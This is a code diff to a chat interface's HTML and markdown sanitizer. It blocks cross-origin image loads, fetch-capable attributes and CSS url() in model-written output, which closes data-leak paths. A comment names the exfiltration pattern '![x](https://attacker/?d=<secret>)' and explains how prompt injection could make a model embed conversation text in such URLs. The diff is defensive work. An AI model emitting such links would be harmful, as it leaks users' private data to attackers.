@@ -307,14 +307,30 @@ function moreListPayloadFromHref(href) {
 // injection into `![x](https://attacker/?d=<secret>)`, which would leak data
 // the moment the reply renders. It renders as a click-to-load placeholder
 // naming the host instead; _bindChatRemoteImageLoad() swaps in the image.
+//
+// _isSameOriginFetchUrl is the one "loads immediately" rule: imageHtml uses
+// it for markdown images and sanitizeAllowedHtml for every fetch-capable
+// attribute in model-written raw HTML.
+function _isSameOriginFetchUrl(parsed) {
+  return parsed.origin === window.location.origin
+    && (parsed.protocol === 'https:' || parsed.protocol === 'http:');
+}
+
+function _isSameOriginFetchUrlText(rawUrl) {
+  try {
+    return _isSameOriginFetchUrl(new URL(String(rawUrl || '').trim(), window.location.origin));
+  } catch (_) {
+    return false;
+  }
+}
+
 function imageHtml(alt, url, title) {
   const rawUrl = String(url || '').trim();
   let safeUrl = '';
   let remoteHost = '';
   try {
     const parsed = new URL(rawUrl, window.location.origin);
-    const sameOrigin = parsed.origin === window.location.origin
-      && (parsed.protocol === 'https:' || parsed.protocol === 'http:');
+    const sameOrigin = _isSameOriginFetchUrl(parsed);
     if (sameOrigin || parsed.protocol === 'https:') safeUrl = parsed.href;
     if (!sameOrigin) remoteHost = parsed.host;
   } catch (_) {
@@ -475,12 +491,26 @@ const _SAFE_CSS_POSITIONS = new Set(['static', 'relative']);
 function _isOverlayStyle(value) {
   const css = String(value || '');
   if (css.includes('\\') || css.includes('/*')) return true;
-  const decl = /(?:^|;)\s*position\s*:\s*([^;]*)/gi;
+  // `position` as a whole property name anywhere (so `@x{}position:fixed` is
+  // seen), but not the tail of `background-position` / `object-position`.
+  const decl = /(?<![A-Za-z0-9_-])position\s*:\s*([^;]*)/gi;
   let m;
   while ((m = decl.exec(css)) !== null) {
     if (!_SAFE_CSS_POSITIONS.has(m[1].trim().toLowerCase())) return true;
   }
   return false;
+}
+
+// Model-written raw HTML must not make the browser fetch from another origin
+// on render (prompt injection could put conversation text in the URL). These
+// attributes fetch without a click; each is dropped unless its URL passes the
+// same rule imageHtml uses to load an image immediately. `href` fetches only
+// off an <a> (an <a> needs a click), so it is checked on every other tag.
+const _ALLOWED_HTML_FETCH_ATTRS = new Set(['src', 'poster', 'background', 'data', 'ping']);
+
+function _getAttr(el, name) {
+  const attr = Array.from(el.attributes).find(a => a.name.toLowerCase() === name);
+  return attr ? attr.value : null;
 }
 
 function _cleanAllowedHtmlOnce(htmlString) {
@@ -490,9 +520,21 @@ function _cleanAllowedHtmlOnce(htmlString) {
     // Upper-case the tag for comparison: HTML tagNames are upper-case, but
     // SVG/MathML elements preserve their original (lower/camel) case, so a
     // raw `Set.has(el.tagName)` would miss e.g. a namespaced <script>.
-    if (_ALLOWED_HTML_BAD_TAGS.has(el.tagName.toUpperCase())) {
+    const tag = el.tagName.toUpperCase();
+    if (_ALLOWED_HTML_BAD_TAGS.has(tag)) {
       el.remove();
       continue;
+    }
+    // A remote <img> becomes the same click-to-load placeholder a remote
+    // markdown image gets. (A dangerous-scheme src is dropped below instead.)
+    if (tag === 'IMG') {
+      const src = _getAttr(el, 'src');
+      if (src !== null && !_isDangerousUrl(src) && !_isSameOriginFetchUrlText(src)) {
+        const swap = document.createElement('template');
+        swap.innerHTML = imageHtml(_getAttr(el, 'alt') || '', src, _getAttr(el, 'title') || '');
+        el.replaceWith(swap.content);
+        continue;
+      }
     }
     for (const attr of Array.from(el.attributes)) {
       const name = attr.name.toLowerCase();
@@ -504,11 +546,23 @@ function _cleanAllowedHtmlOnce(htmlString) {
       }
       if (name === 'style') {
         const value = _compactUrlSchemeValue(attr.value);
-        if (/javascript:|vbscript:|data:|expression\(/.test(value)
+        // url( / image-set( / src( would fetch on render (any property).
+        if (/javascript:|vbscript:|data:|expression\(|url\(|image-set\(|src\(/.test(value)
             || _isOverlayStyle(attr.value)
             || (el.style && el.style.position && !_SAFE_CSS_POSITIONS.has(el.style.position.toLowerCase()))) {
           el.removeAttribute(attr.name);
         }
+        continue;
+      }
+      // srcset (<img>/<source>) is never kept: each candidate would fetch.
+      if (name === 'srcset') {
+        el.removeAttribute(attr.name);
+        continue;
+      }
+      if ((_ALLOWED_HTML_FETCH_ATTRS.has(name)
+           || ((name === 'href' || name === 'xlink:href') && tag !== 'A'))
+          && !_isSameOriginFetchUrlText(attr.value)) {
+        el.removeAttribute(attr.name);
         continue;
       }
       // Neutralize javascript:/vbscript:/data: in URL-bearing attributes.
